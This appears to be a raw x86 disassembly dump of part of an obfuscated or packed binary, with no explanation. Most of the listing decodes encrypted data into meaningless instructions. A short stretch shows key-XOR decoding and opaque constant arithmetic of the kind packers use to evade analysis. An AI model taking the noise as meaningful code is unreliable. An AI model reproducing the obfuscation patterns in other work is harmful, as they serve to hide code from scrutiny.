  40f1cf:	mov    cs,WORD PTR ds:0xedeebf8c
  40f1d5:	add    cl,ch
  40f1d7:	xor    DWORD PTR [esi+0x7d91f53f],0xffffffad
  40f1de:	push   ecx
  40f1df:	sub    al,0x45
  40f1e1:	sbb    edi,DWORD PTR [esi-0x4f]
  40f1e4:	cmp    DWORD PTR [eax],esp
  40f1e6:	adc    ah,ah
  40f1e8:	and    BYTE PTR [eax+ebp*8],bl
  40f1eb:	mov    esi,0x22dbd9aa
  40f1f0:	div    BYTE PTR ss:[ebp-0x68]
  40f1f4:	loope  0x40f259
  40f1f6:	mov    ch,0x33
  40f1f8:	ret    0x6628
  40f1fb:	and    al,0xb0
  40f1fd:	ins    DWORD PTR es:[edi],dx
  40f1fe:	cmp    dh,BYTE PTR [esi]
  40f200:	push   esi
  40f201:	jecxz  0x40f251
  40f203:	fldcw  WORD PTR [ecx-0x5]
  40f206:	push   edx
  40f207:	cmp    al,0x29
  40f209:	mov    ah,ch
  40f20b:	dec    esp
  40f20c:	(bad)  
  40f20d:	mov    eax,0x901b938e
  40f212:	scas   al,BYTE PTR es:[edi]
  40f213:	jmp    0x12e7:0xa935777a
  40f21a:	pop    ebx
  40f21b:	jo     0x40f28a
  40f21d:	mov    bh,BYTE PTR [edx]
  40f21f:	mov    ah,0x9b
  40f221:	sbb    ecx,DWORD PTR [ebx]
  40f223:	mov    ecx,0x181d1a53
  40f228:	mov    edi,DWORD PTR [edx+0x347497d0]
  40f22e:	ret    
  40f22f:	inc    eax
  40f230:	addr16 adc eax,0x7e1e209
  40f236:	push   edi
  40f237:	popf   
  40f238:	dec    eax
  40f239:	mov    esi,0x9b59a9c3
  40f23e:	aaa    
  40f23f:	sbb    ecx,esi
  40f241:	sub    al,ah
  40f243:	pop    ebx
  40f244:	(bad)  
  40f245:	enter  0x24c3,0x26
  40f249:	adc    al,0x71
  40f24b:	push   ecx
  40f24c:	sub    eax,0x146186db
  40f251:	xchg   esi,eax
  40f252:	pop    esp
  40f253:	cmp    DWORD PTR [eax-0x6b399909],esp
  40f259:	jno    0x40f1e4
  40f25b:	arpl   si,dx
  40f25d:	hlt    
  40f25e:	fist   WORD PTR [eax+edi*8+0x19629e40]
  40f265:	add    eax,0xaa09129
  40f26a:	xchg   edi,eax
  40f26b:	xchg   ecx,eax
  40f26c:	xchg   edx,eax
  40f26d:	push   esi
  40f26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f26f:	push   ds
  40f270:	inc    ebx
  40f271:	mov    edx,0xd9d5bb67
  40f276:	(bad)  
  40f277:	in     al,dx
  40f278:	push   edi
  40f279:	push   esi
  40f27a:	jl     0x40f282
  40f27c:	data16 (bad) 
  40f27e:	xchg   ebx,eax
  40f27f:	and    eax,0x9df208f6
  40f284:	mov    dl,0x4a
  40f286:	dec    edi
  40f287:	pop    esi
  40f288:	xchg   esp,eax
  40f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28a:	or     BYTE PTR ds:0x95f57f9,bh
  40f290:	outs   dx,DWORD PTR ds:[esi]
  40f291:	push   esp
  40f292:	mov    WORD PTR ds:0x780f1d40,cs
  40f298:	mov    ebx,0x7d489ecb
  40f29d:	adc    al,0x93
  40f29f:	nop
  40f2a0:	dec    ebx
  40f2a1:	pop    edx
  40f2a2:	shl    DWORD PTR [eax+0x175025f2],0xd5
  40f2a9:	sbb    bl,al
  40f2ab:	shr    DWORD PTR [esi+0x393a04ac],1
  40f2b1:	fnop   
  40f2b3:	sub    bl,BYTE PTR [ecx+ebx*1+0x5e]
  40f2b7:	dec    ebp
  40f2b8:	and    eax,0x890cf95c
  40f2bd:	and    DWORD PTR [eax],ecx
  40f2bf:	push   ebp
  40f2c0:	jmp    0xfb29a29f
  40f2c5:	or     ecx,DWORD PTR [edi]
  40f2c7:	leave  
  40f2c8:	cmp    al,0x4b
  40f2ca:	push   0x57
  40f2cc:	cld    
  40f2cd:	jle    0x40f2da
  40f2cf:	inc    ecx
  40f2d0:	or     esp,esp
  40f2d2:	int3   
  40f2d3:	and    dl,dh
  40f2d5:	inc    ebp
  40f2d6:	sbb    BYTE PTR [esi],ch
  40f2d8:	jno    0x40f2ec
  40f2da:	lods   al,BYTE PTR ds:[esi]
  40f2db:	jo     0x40f2f1
  40f2dd:	std    
  40f2de:	push   esp
  40f2df:	in     eax,0x24
  40f2e1:	out    dx,al
  40f2e2:	outs   dx,BYTE PTR ds:[esi]
  40f2e3:	imul   eax,esp,0x8d3ff245
  40f2e9:	inc    edx
  40f2ea:	jmp    0x40f2e1
  40f2ec:	repz xchg ebx,eax
  40f2ee:	imul   ch
  40f2f0:	xor    edi,esi
  40f2f2:	aaa    
  40f2f3:	sbb    BYTE PTR [eax+eax*1-0x1bffee99],ch
  40f2fa:	add    ch,bl
  40f2fc:	popf   
  40f2fd:	push   eax
  40f2fe:	stos   BYTE PTR es:[edi],al
  40f2ff:	cdq    
  40f300:	dec    ebx
  40f302:	aad    0xd3
  40f304:	jmp    0x40f30c
  40f306:	xor    ch,0x62
  40f309:	and    DWORD PTR [edi+0x223666ae],edi
  40f30f:	jae    0x40f304
  40f311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f312:	cmc    
  40f313:	retf   0x7f43
  40f316:	or     edi,ebx
  40f318:	fadd   DWORD PTR [ebx+0x53]
  40f31b:	repz adc al,0x7d
  40f31e:	loop   0x40f333
  40f320:	push   0xde851b9e
  40f325:	push   cs
  40f326:	jge    0x40f2fe
  40f328:	ins    BYTE PTR es:[edi],dx
  40f329:	xor    BYTE PTR [edx+ebx*8],bl
  40f32c:	add    al,0x80
  40f32e:	cli    
  40f32f:	add    BYTE PTR [ecx+esi*1-0x4a],ch
  40f333:	xchg   BYTE PTR [ebx-0x7599c987],al
  40f339:	cmp    eax,0xdb7e28e7
  40f33e:	cwde   
  40f33f:	xor    al,BYTE PTR [edx+0x15bc8a90]
  40f345:	call   0xf9f60765
  40f34a:	mov    ch,0xfd
  40f34c:	addr16 sub al,0x15
  40f34f:	mov    esi,0xfb6afb30
  40f354:	push   0xffffffbf
  40f356:	ins    BYTE PTR es:[edi],dx
  40f357:	add    eax,0x87d66e11
  40f35c:	and    DWORD PTR [eax-0x3a],eax
  40f35f:	jno    0x40f382
  40f361:	jg     0x40f30e
  40f363:	sar    ah,1
  40f365:	sbb    eax,0x33900b17
  40f36a:	mov    ds:0xf6ce897a,eax
  40f36f:	mov    edi,0x5e694586
  40f374:	xor    al,0xc4
  40f376:	rol    DWORD PTR [esp+ecx*4],cl
  40f379:	idiv   DWORD PTR [edx]
  40f37b:	cmp    eax,0x664bcbfc
  40f380:	sbb    al,0x3d
  40f382:	fldcw  WORD PTR [esi+0x4a067741]
  40f388:	(bad)  
  40f38a:	jb     0x40f34b
  40f38c:	xor    DWORD PTR gs:[ebx],ecx
  40f38f:	mov    WORD PTR [edx],ds
  40f391:	inc    ebp
  40f392:	mov    ebp,0xb520e552
  40f397:	pop    ds
  40f398:	fcomp  QWORD PTR [edi-0x325c202d]
  40f39e:	lods   al,BYTE PTR ds:[esi]
  40f39f:	or     eax,0x51d40ff
  40f3a4:	dec    esi
  40f3a5:	in     eax,0xb5
  40f3a7:	test   al,0x30
  40f3a9:	mov    bh,0x4f
  40f3ab:	outs   dx,DWORD PTR ds:[esi]
  40f3ac:	not    DWORD PTR [ebx-0xc]
  40f3af:	fstp   TBYTE PTR [edx+0x4b7a68c7]
  40f3b5:	sbb    eax,0xea7b4228
  40f3ba:	sbb    DWORD PTR [esi-0x3b],edi
  40f3bd:	add    DWORD PTR [di+0x13],ebp
  40f3c1:	pop    edx
  40f3c2:	nop
  40f3c3:	imul   al
  40f3c5:	cmp    BYTE PTR [ebx+0x11d607a3],bl
  40f3cb:	mov    ah,0xe6
  40f3cd:	out    dx,eax
  40f3ce:	ins    BYTE PTR es:[edi],dx
  40f3cf:	mov    eax,0x169c2119
  40f3d4:	push   edx
  40f3d5:	cmp    eax,DWORD PTR [ecx]
  40f3d7:	ret    0xce2c
  40f3da:	in     eax,0xc7
  40f3dc:	adc    al,ah
  40f3de:	mov    edi,fs
  40f3e0:	xchg   DWORD PTR ds:0x4d87588e,esp
  40f3e6:	out    dx,eax
  40f3e7:	dec    edi
  40f3e8:	xchg   ebp,eax
  40f3e9:	dec    edx
  40f3ea:	cmp    al,0xc7
  40f3ec:	push   edx
  40f3ed:	in     eax,0x27
  40f3ef:	ret    
  40f3f0:	xchg   ebx,eax
  40f3f1:	dec    edx
  40f3f2:	out    dx,al
  40f3f3:	adc    eax,0x20b44588
  40f3f8:	add    edx,ebx
  40f3fa:	inc    esp
  40f3fb:	and    eax,0x9e03711
  40f400:	mov    dh,0x4a
  40f402:	add    al,0xf8
  40f404:	std    
  40f405:	push   cs
  40f406:	js     0x40f475
  40f408:	push   ebp
  40f409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40a:	sub    eax,0x9261a787
  40f40f:	jbe    0x40f459
  40f411:	dec    edi
  40f412:	xchg   edi,eax
  40f413:	jmp    0x46e3:0x925164bb
  40f41a:	lods   al,BYTE PTR ds:[esi]
  40f41b:	sbb    BYTE PTR [edi],ch
  40f41d:	loop   0x40f3b1
  40f41f:	hlt    
  40f420:	pop    ds
  40f421:	inc    edi
  40f422:	adc    ah,dh
  40f424:	sar    DWORD PTR [edi+0x12e627c5],cl
  40f42a:	std    
  40f42b:	mov    esi,0xa12cd1e4
  40f430:	aas    
  40f431:	loope  0x40f3d6
  40f433:	and    eax,0xf67980da
  40f438:	mov    cl,0x86
  40f43a:	les    edi,FWORD PTR [edx-0x107c889f]
  40f440:	sub    DWORD PTR [ecx-0x13],0xfffffff5
  40f444:	push   ds
  40f445:	sbb    eax,0x69ba36f3
  40f44a:	jmp    0x40f46b
  40f44c:	mov    ?,WORD PTR [eax-0x3c]
  40f44f:	push   esp
  40f450:	xor    BYTE PTR [ecx-0x69],ch
  40f453:	jnp    0x40f3f3
  40f455:	mov    edx,0xccb448a6
  40f45a:	and    eax,0xb6f71520
  40f45f:	add    ebx,DWORD PTR [ecx+0x17706f3e]
  40f465:	and    BYTE PTR [eax-0x30],bl
  40f468:	mov    esp,0x97eb48ab
  40f46d:	test   eax,0x753a9e26
  40f472:	sub    BYTE PTR [ecx+0x35],ch
  40f475:	mul    DWORD PTR [eax+0x52840a0f]
  40f47b:	fistp  WORD PTR [ebx+ecx*4-0x36]
  40f47f:	xchg   DWORD PTR [ebp+0x7d],eax
  40f482:	dec    ecx
  40f483:	or     edi,DWORD PTR [edi-0x469eedf3]
  40f489:	jno    0x40f476
  40f48b:	adc    BYTE PTR [edx+0x74fdd9cf],al
  40f491:	adc    BYTE PTR [ebx+0x320e89df],bl
  40f497:	stos   DWORD PTR es:[edi],eax
  40f498:	imul   esi,DWORD PTR [ebx+0x5bea08d1],0xd3d316cf
  40f4a2:	sbb    ah,BYTE PTR [eax-0x39]
  40f4a5:	adc    eax,0x1bcd17de
  40f4aa:	jg     0x40f434
  40f4ac:	(bad)  
  40f4ae:	add    al,0x41
  40f4b0:	mov    ebp,0x3aa7ef88
  40f4b5:	aaa    
  40f4b6:	jnp    0x40f491
  40f4b8:	xchg   DWORD PTR [ebp+0x65],edi
  40f4bb:	mov    al,0x33
  40f4bd:	fsubr  st,st(2)
  40f4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4c0:	shr    BYTE PTR [edi+0xd],cl
  40f4c3:	aam    0xc2
  40f4c5:	add    al,0x39
  40f4c7:	push   es
  40f4c8:	jmp    0xa70:0x7c38aebb
  40f4cf:	imul   edi,edi,0xffffffae
  40f4d2:	xchg   edx,eax
  40f4d3:	test   DWORD PTR [eax],edx
  40f4d5:	xchg   ebp,eax
  40f4d6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40f4d8:	inc    ebx
  40f4d9:	das    
  40f4da:	fistp  QWORD PTR [edi+0x466d023e]
  40f4e0:	mov    bh,0x81
  40f4e2:	xor    eax,0x796f4cca
  40f4e7:	mov    ah,0xf8
  40f4e9:	jnp    0x40f478
  40f4eb:	add    eax,0x434569b9
  40f4f0:	jl     0x40f52c
  40f4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f3:	(bad)  
  40f4f4:	ficomp WORD PTR [eax+eax*4+0x25]
  40f4f8:	and    eax,0x81bda840
  40f4fd:	push   ecx
  40f4fe:	fcmovne st,st(2)
  40f500:	inc    esp
  40f501:	dec    ecx
  40f502:	jbe    0x40f4a3
  40f504:	retf   
  40f505:	jb     0x40f545
  40f507:	ss push ebp
  40f509:	sahf   
  40f50a:	test   BYTE PTR [ebp+ecx*4+0x7e],dh
  40f50e:	pushf  
  40f50f:	add    al,0xbb
  40f511:	(bad)  
  40f512:	push   ds
  40f513:	jmp    0xb3abfc7e
  40f518:	mov    ebx,0x347afe31
  40f51d:	fmul   QWORD PTR [ecx-0x65536c6]
  40f523:	or     DWORD PTR [edi-0x11],ebp
  40f526:	or     ebp,esi
  40f528:	jnp    0x40f59d
  40f52a:	popa   
  40f52b:	iret   
  40f52c:	cmp    bl,BYTE PTR [eax+0x11]
  40f52f:	stos   BYTE PTR es:[edi],al
  40f530:	fsubrp st(3),st
  40f532:	(bad)  
  40f533:	xor    ebp,DWORD PTR [edi]
  40f535:	fistp  DWORD PTR [esi-0x15]
  40f538:	push   ebp
  40f539:	mov    ebx,0x324920a1
  40f53e:	inc    ecx
  40f53f:	xchg   esp,eax
  40f540:	repz sbb ah,BYTE PTR [edi+0x59b42496]
  40f547:	dec    esp
  40f548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f549:	xor    bl,BYTE PTR [ecx+0x2e7bee7b]
  40f54f:	rcr    DWORD PTR [edx-0x2d0bbae1],0xe1
  40f556:	ret    
  40f557:	mov    ebp,0x718d50c2
  40f55c:	or     ecx,DWORD PTR [ebx+0x57]
  40f55f:	sbb    ch,BYTE PTR gs:[ecx+0x6]
  40f563:	loope  0x40f566
  40f565:	sbb    eax,0x3b23800
  40f56a:	adc    DWORD PTR [esp+edx*8+0x2071b2c1],edi
  40f571:	xor    ch,dh
  40f573:	sub    edx,edi
  40f575:	cwde   
  40f576:	shl    ch,0x9a
  40f579:	leave  
  40f57a:	cmp    dl,ah
  40f57c:	or     eax,0x99166883
  40f581:	or     DWORD PTR [ebx+0x4e],esi
  40f584:	mov    esi,DWORD PTR gs:[edx-0x128f7ec1]
  40f58b:	cmp    BYTE PTR [eax+0x1bf9bdce],bh
  40f591:	aam    0x7
  40f593:	sbb    dh,BYTE PTR [ebp+0x3da6907c]
  40f599:	ins    BYTE PTR es:[edi],dx
  40f59a:	lds    ebx,FWORD PTR [ebx+ebx*2-0x925740]
  40f5a1:	inc    esp
  40f5a2:	shl    DWORD PTR [ebp+edi*2+0x21],0xdc
  40f5a7:	push   ebp
  40f5a8:	xor    ebx,ebp
  40f5aa:	sub    eax,0x88f1a2a9
  40f5af:	sub    DWORD PTR [edx],eax
  40f5b1:	(bad)  
  40f5b2:	fwait
  40f5b3:	cmp    ecx,eax
  40f5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi+0x305c25fb]
  40f687:	and    eax,0xafc331df
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffa0
  40f693:	bound  esi,QWORD PTR [eax-0x7d]
  40f696:	xor    al,0x5e
  40f698:	fadd   QWORD PTR [eax]
  40f69a:	ja     0x40f647
  40f69c:	or     ebx,DWORD PTR [edi-0x7f005bbd]
  40f6a2:	add    eax,0xbd4fe7b2
  40f6a7:	fild   WORD PTR ds:0xdc3f9fd3
  40f6ad:	inc    ecx
  40f6ae:	lods   eax,DWORD PTR ds:[esi]
  40f6af:	jp     0x40f66f
  40f6b1:	xchg   esp,eax
  40f6b2:	mov    edi,0x9c8ece03
  40f6b7:	ror    dl,cl
  40f6b9:	dec    eax
  40f6ba:	scas   eax,DWORD PTR es:[edi]
  40f6bb:	dec    edx
  40f6bc:	adc    cl,BYTE PTR ss:[ecx+eax*2-0x53]
  40f6c1:	xor    esi,DWORD PTR [ebp-0x11]
  40f6c4:	sub    BYTE PTR [esi],ch
  40f6c6:	js     0x40f6ee
  40f6c8:	mov    ecx,0xd5e2bed1
  40f6cd:	xchg   ecx,eax
  40f6ce:	ret    0xec50
  40f6d1:	and    ch,al
  40f6d3:	sbb    al,0x23
  40f6d5:	inc    eax
  40f6d6:	jmp    0xadad0dfc
  40f6db:	mov    ebp,0x65ff5bc1
  40f6e0:	pop    esi
  40f6e1:	push   ebx
  40f6e2:	add    cl,cl
  40f6e4:	xor    dl,ch
  40f6e6:	sub    BYTE PTR [esi],0x13
  40f6e9:	call   0x8944:0x5d9e47f9
  40f6f0:	sbb    DWORD PTR [ecx+edi*8+0x3b],ecx
  40f6f4:	sub    eax,0x915434d4
  40f6f9:	jecxz  0x40f6ad
  40f6fb:	pop    ss
  40f6fc:	(bad)  
  40f6fd:	nop
  40f6fe:	pop    edx
  40f6ff:	pop    esi
  40f700:	jmp    0x65bd:0x55d19adc
  40f707:	jp     0x40f695
  40f709:	sbb    eax,0xf77f1d66
  40f70e:	clc    
  40f70f:	(bad)  
  40f711:	fwait
  40f712:	xchg   edx,eax
  40f713:	pop    esi
  40f714:	jl     0x40f779
  40f716:	test   al,0x38
  40f718:	shr    ch,cl
  40f71a:	add    BYTE PTR [ecx-0x19da0c08],al
  40f720:	sahf   
  40f721:	into   
  40f722:	mov    esi,0x61c9baa6
  40f727:	int    0x8c
  40f729:	pusha  
  40f72a:	sub    al,0x15
  40f72c:	mov    dh,0xf5
  40f72e:	mov    ch,0xed
  40f730:	mov    ch,0x5d
  40f732:	neg    BYTE PTR [ecx]
  40f734:	cmp    eax,DWORD PTR [eax]
  40f736:	(bad)  
  40f737:	sbb    BYTE PTR [edi],al
  40f739:	loop   0x40f7a1
  40f73b:	sar    DWORD PTR [edi-0x9],cl
  40f73e:	sub    BYTE PTR [eax+eiz*8+0x70],0x6
  40f743:	mov    edi,0x6304efc8
  40f748:	retf   0x23f2
  40f74b:	fiadd  DWORD PTR [ecx]
  40f74d:	push   es
  40f74e:	fdivrp st(6),st
  40f750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f751:	cmc    
  40f752:	sbb    cl,BYTE PTR ss:[edx+0x36]
  40f756:	add    eax,DWORD PTR [eax]
  40f758:	lods   al,BYTE PTR ds:[esi]
  40f759:	icebp  
  40f75a:	dec    ecx
  40f75b:	pop    edx
  40f75c:	xchg   edi,eax
  40f75d:	(bad)  
  40f75e:	push   ebp
  40f75f:	cdq    
  40f760:	ja     0x40f765
  40f762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f763:	ss add ah,ah
  40f766:	dec    eax
  40f767:	xchg   ecx,eax
  40f768:	pusha  
  40f769:	scas   eax,DWORD PTR es:[edi]
  40f76a:	hlt    
  40f76b:	(bad)  
  40f76c:	pop    esp
  40f76d:	push   cs
  40f76e:	push   0x4f89401c
  40f773:	mov    BYTE PTR [ebx+edx*4],dl
  40f776:	std    
  40f777:	sahf   
  40f778:	pop    ecx
  40f779:	ret    
  40f77a:	sub    esp,DWORD PTR [ecx-0x75]
  40f77d:	fwait
  40f77e:	jecxz  0x40f7e6
  40f780:	xor    eax,0xf038b7d9
  40f785:	data16 lahf 
  40f787:	jne    0x40f7aa
  40f789:	(bad)  [eax-0x70]
  40f78c:	pop    ss
  40f78d:	cmp    DWORD PTR [edi],edx
  40f78f:	mov    cl,0xb5
  40f791:	xchg   ebp,eax
  40f792:	inc    ebp
  40f793:	dec    edx
  40f794:	stos   DWORD PTR es:[edi],eax
  40f795:	clc    
  40f796:	cmc    
  40f797:	test   eax,0xb1e24e5f
  40f79c:	lock xchg DWORD PTR [ebp+0x53bd44c8],edx
  40f7a3:	shl    DWORD PTR [edx+0x26],cl
  40f7a6:	adc    BYTE PTR [edx],0x2f
  40f7a9:	push   ecx
  40f7aa:	jno    0x40f7bf
  40f7ac:	pop    eax
  40f7ad:	mov    bh,0x94
  40f7af:	sbb    eax,DWORD PTR [edi-0x31af8140]
  40f7b5:	bound  ebx,QWORD PTR ds:0x70419c8f
  40f7bb:	in     eax,dx
  40f7bc:	adc    DWORD PTR [ecx+0x43],edi
  40f7bf:	sub    DWORD PTR [edx+eax*4],ecx
  40f7c2:	out    dx,al
  40f7c3:	sub    DWORD PTR ds:0x4c6731af,ecx
  40f7c9:	aas    
  40f7ca:	pop    ecx
  40f7cb:	mov    esp,0xa1fa2d92
  40f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d1:	xchg   DWORD PTR [eax],edi
  40f7d3:	shl    edi,cl
  40f7d5:	int    0x6b
  40f7d7:	mov    dl,0xd4
  40f7d9:	bound  ebp,QWORD PTR [esi+ebx*8-0x2fa6be99]
  40f7e0:	pop    esp
  40f7e1:	mov    dh,0xf1
  40f7e3:	(bad)  
  40f7e4:	lock mov ecx,0x41cb42fe
  40f7ea:	cmp    eax,0xa624696c
  40f7ef:	call   0x76e84a0d
  40f7f4:	pusha  
  40f7f5:	mov    ah,0xb0
  40f7f7:	das    
  40f7f8:	mov    eax,0x8a850c1c
  40f7fd:	inc    ebx
  40f7fe:	dec    ebp
  40f7ff:	arpl   WORD PTR [ebx],ax
  40f801:	xchg   esp,eax
  40f802:	sbb    DWORD PTR [esi],0x585e9442
  40f808:	jnp    0x40f7cf
  40f80a:	ins    DWORD PTR es:[edi],dx
  40f80b:	add    BYTE PTR [ecx+0x11fd1953],cl
  40f811:	lds    edx,FWORD PTR [eax+0x7ed0970f]
  40f817:	jne    0x40f889
  40f819:	cwde   
  40f81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f81b:	sub    al,0xf5
  40f81d:	sub    ebx,DWORD PTR [esi+0x5a87c872]
  40f823:	push   0xc9e4c838
  40f828:	fcomip st,st(7)
  40f82a:	mov    ds,WORD PTR [eax]
  40f82c:	iret   
  40f82d:	push   ss
  40f82e:	fimul  WORD PTR [ebx+ecx*2-0x4850a6b1]
  40f835:	ficomp DWORD PTR [ecx-0x3c]
  40f838:	sahf   
  40f839:	and    al,0x51
  40f83b:	call   0x55cb5a30
  40f840:	mov    fs,WORD PTR [ebx+edx*2+0x56350ae2]
  40f847:	jl     0x40f811
  40f849:	push   edi
  40f84a:	into   
  40f84b:	int    0x87
  40f84d:	jne    0x40f87a
  40f84f:	mov    al,ds:0x9f58309f
  40f854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f855:	std    
  40f856:	or     DWORD PTR [edi],edx
  40f858:	push   eax
  40f859:	add    DWORD PTR [ecx],0x1b6e348c
  40f85f:	retf   0x791f
  40f862:	mov    DWORD PTR [edx],edi
  40f864:	dec    edi
  40f865:	nop
  40f866:	mov    cl,0x98
  40f868:	dec    ebp
  40f869:	ins    DWORD PTR es:[edi],dx
  40f86a:	test   DWORD PTR [ebx],esi
  40f86c:	dec    ebx
  40f86d:	sar    DWORD PTR [edi-0x4a35c691],0x18
  40f874:	jg     0x40f8bb
  40f876:	imul   ebx,DWORD PTR [ebx],0xffffffe3
  40f879:	xchg   ebx,eax
  40f87a:	outs   dx,BYTE PTR ds:[esi]
  40f87b:	and    eax,0x6ab97b1e
  40f880:	cmp    ebx,DWORD PTR [edx]
  40f882:	or     DWORD PTR [ebp+0x6008ab88],esi
  40f888:	dec    esp
  40f889:	inc    ebx
  40f88a:	(bad)  
  40f88b:	pop    DWORD PTR [ebx+0x1772b98e]
  40f891:	or     DWORD PTR [ebp-0x48ecd1ae],0xffffff8b
  40f898:	ja     0x40f8ec
  40f89a:	add    DWORD PTR [edx+0x39c1296f],ecx
  40f8a0:	or     eax,0xd09923e2
  40f8a5:	mov    DWORD PTR [eax+ecx*1+0x4d18aa1a],esi
  40f8ac:	cmp    ebx,DWORD PTR [esi+edx*4+0x6a]
  40f8b0:	(bad)  
  40f8b1:	call   0x83b1:0x72f34189
  40f8b8:	ins    DWORD PTR es:[edi],dx
  40f8b9:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8bb:	pop    ecx
  40f8bc:	sub    BYTE PTR [edx+eiz*8-0x26],dl
  40f8c0:	jno    0x40f914
  40f8c2:	add    ah,BYTE PTR [edx-0x1939cc8d]
  40f8c8:	test   DWORD PTR [ecx-0x5a],esp
  40f8cb:	jecxz  0x40f8eb
  40f8cd:	cmp    ebp,edx
  40f8cf:	test   BYTE PTR [esi+0x67bb193a],dh
  40f8d5:	mov    ds:0xe63622d3,eax
  40f8da:	xor    DWORD PTR [ecx-0x26],eax
  40f8dd:	cs leave 
  40f8df:	mov    dl,0xdf
  40f8e1:	lods   eax,DWORD PTR ds:[esi]
  40f8e2:	cmp    dh,ah
  40f8e4:	(bad)  
  40f8e5:	cmp    al,0xc4
  40f8e7:	sbb    eax,0x2dcc3441
  40f8ec:	or     al,0x25
  40f8ee:	mov    BYTE PTR [bp+si],dh
  40f8f1:	mov    ecx,0xadebc19a
  40f8f6:	and    DWORD PTR [ebx-0x6c],0x1
  40f8fa:	jno    0x40f8b4
  40f8fc:	test   eax,0x5e165355
  40f901:	sbb    DWORD PTR [ebx+0x38],eax
  40f904:	repz add edi,DWORD PTR [esi-0x23fdc013]
  40f90b:	dec    esi
  40f90c:	jle    0x40f907
  40f90e:	(bad)  
  40f910:	fsubr  QWORD PTR ds:0x3f3877e1
  40f916:	mov    ebp,0xaaaef8d0
  40f91b:	sti    
  40f91c:	or     ch,ch
  40f91e:	call   0x9e79:0x4078fc4d
  40f925:	fimul  DWORD PTR [ebx+0x57]
  40f928:	push   cs
  40f929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f92a:	ins    BYTE PTR es:[edi],dx
  40f92b:	xor    dl,ch
  40f92d:	pop    ebp
  40f92e:	sbb    BYTE PTR [esi+0x54],ah
  40f931:	inc    ebp
  40f932:	push   ebx
  40f933:	mov    DWORD PTR [edx+0x3fa078e9],edx
  40f939:	mov    dh,0xcf
  40f93b:	ss push ebp
  40f93d:	inc    esi
  40f93e:	lahf   
  40f93f:	push   DWORD PTR ds:0x667b1ca1
  40f945:	and    DWORD PTR [edx],edi
  40f947:	xor    ch,BYTE PTR [ebx]
  40f949:	test   al,0x9
  40f94b:	sub    al,0x10
  40f94d:	add    al,0xf6
  40f94f:	mov    edx,0xfe66ca22
  40f954:	jbe    0x40f9a8
  40f956:	dec    edx
  40f957:	adc    al,0x1b
  40f959:	data16 sub BYTE PTR [ecx],bh
  40f95c:	sub    ebx,DWORD PTR [edi+0x6a]
  40f95f:	jnp    0x40f914
  40f961:	cmc    
  40f962:	mul    BYTE PTR [eax+ebx*2-0x70]
  40f966:	enter  0xc640,0x46
